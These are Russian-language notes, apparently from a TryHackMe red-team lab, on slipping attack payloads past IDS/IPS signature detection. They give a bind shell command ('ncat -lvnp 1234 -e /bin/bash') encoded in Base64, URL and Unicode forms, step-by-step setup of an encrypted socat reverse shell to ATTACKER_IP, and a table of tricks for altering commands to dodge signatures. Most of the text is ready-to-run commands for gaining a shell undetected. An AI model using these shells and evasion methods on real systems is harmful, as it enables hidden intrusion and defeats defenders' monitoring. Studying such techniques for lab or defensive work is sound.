**Обход IDS/IPS через манипуляцию payload**

### 🎯 Главная цель

IDS/IPS **ищет сигнатуры** в **данных** (payload). Если **изменить данные** — сигнатура **не сработает**.

**3 подхода:**
1. **Обфускация и кодирование** payload.
2. **Шифрование** канала.
3. **Модификация** shellcode/команд.


### 1. Обфускация и кодирование payload

**Суть:** Меняем **представление** команды, но она **всё ещё выполняется**.

#### Base64

**Что делает:** Кодирует строку в Base64.

**Пример:**
```bash
cat input.txt
ncat -lvnp 1234 -e /bin/bash

base64 input.txt
bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==
```

**Когда использовать:** Если IDS ищет **конкретную строку** `ncat -lvnp`.


#### URL-кодирование

**Что делает:** Заменяет символы на `%HH` (hex).

**Пример:**
```bash
urlencode ncat -lvnp 1234 -e /bin/bash
ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
```

**Установка:**
```bash
apt install gridsite-clients
```

**Когда использовать:** Если IDS ищет **пробелы** или **спецсимволы**.


#### Escaped Unicode

**Что делает:** Заменяет символы на `\uXXXX`.

**Пример:**
```
ncat -lvnp 1234 -e /bin/bash
\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070...
```

**Как сделать:** Через **CyberChef** → **Escape Unicode Characters**.

**Когда использовать:** Если target **интерпретирует** Unicode.


### 2. Шифрование канала

**Суть:** IDS **не видит** содержимое — трафик **зашифрован**.

#### Шаг 1 — Создать ключ и сертификат

```bash
openssl req -x509 -newkey rsa:4096 -days 365 \
  -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' \
  -nodes -keyout thm-reverse.key -out thm-reverse.crt
```

**Разбор:**
- `-x509` — X.509 сертификат.
- `-newkey rsa:4096` — новый ключ RSA 4096 бит.
- `-days 365` — срок действия 1 год.
- `-subj` — данные организации.
- `-nodes` — не шифровать приватный ключ.
- `-keyout` — файл приватного ключа.
- `-out` — файл сертификата.

**Результат:** `thm-reverse.key`, `thm-reverse.crt`.

#### Шаг 2 — Создать PEM

```bash
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
```

**PEM** = приватный ключ + сертификат.

#### Шаг 3 — Слушать на атакующей машине

```bash
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
```

**Разбор:**
- `-d -d` — отладка.
- `OPENSSL-LISTEN:4443` — шифрованное соединение на порту 4443.
- `cert=thm-reverse.pem` — PEM-файл.
- `verify=0` — не проверять сертификат клиента.
- `fork` — новый процесс на каждое соединение.

#### Шаг 4 — Подключиться с жертвы

```bash
socat OPENSSL:ATTACKER_IP:4443,verify=0 EXEC:/bin/bash
```

**Разбор:**
- `OPENSSL:ATTACKER_IP:4443` — шифрованное соединение.
- `EXEC:/bin/bash` — выполнить bash.

**Результат:** IDS **видит** только **зашифрованный трафик**. Команды **не читаются**.


### 3. Модификация команд

**Суть:** Меняем **команду** так, чтобы IDS **не нашёл сигнатуру**, но target **выполнил**.

| Что ищет IDS | Как обойти |
|--------------|------------|
| `ncat -lvnp` | Поменять порядок флагов: `ncat -v -l -n -p` |
| `ncat -` | Добавить пробел: `ncat  -` |
| `ncat` | Использовать `nc`, `socat`, `ncat` с другим именем |
| Конкретную строку | Base64, URL-кодирование, Unicode |

**Примеры:**
```bash
ncat -lvnp 1234 -e /bin/bash
ncat -v -l -n -p 1234 -e /bin/bash
ncat  -lvnp 1234 -e /bin/bash
socat TCP-LISTEN:1234 EXEC:/bin/bash
```


### 📌 Итог

| Подход | Инструмент | Когда использовать |
|--------|------------|-------------------|
| **Base64** | `base64` | IDS ищет строку |
| **URL-кодирование** | `urlencode` | IDS ищет пробелы |
| **Unicode** | CyberChef | Target понимает Unicode |
| **Шифрование** | `openssl` + `socat` | IDS с DPI |
| **Модификация команд** | Вручную | IDS ищет конкретную команду |

**Главное:**
1. **Кодирование** — быстро, но target **должен уметь декодировать**.
2. **Шифрование** — **надёжно**, IDS **не видит** данные.
3. **Модификация** — **просто**, но IDS **может искать шире**.

**Без обхода payload — IDS **сработает** и **заблокирует** атаку.** 🚀
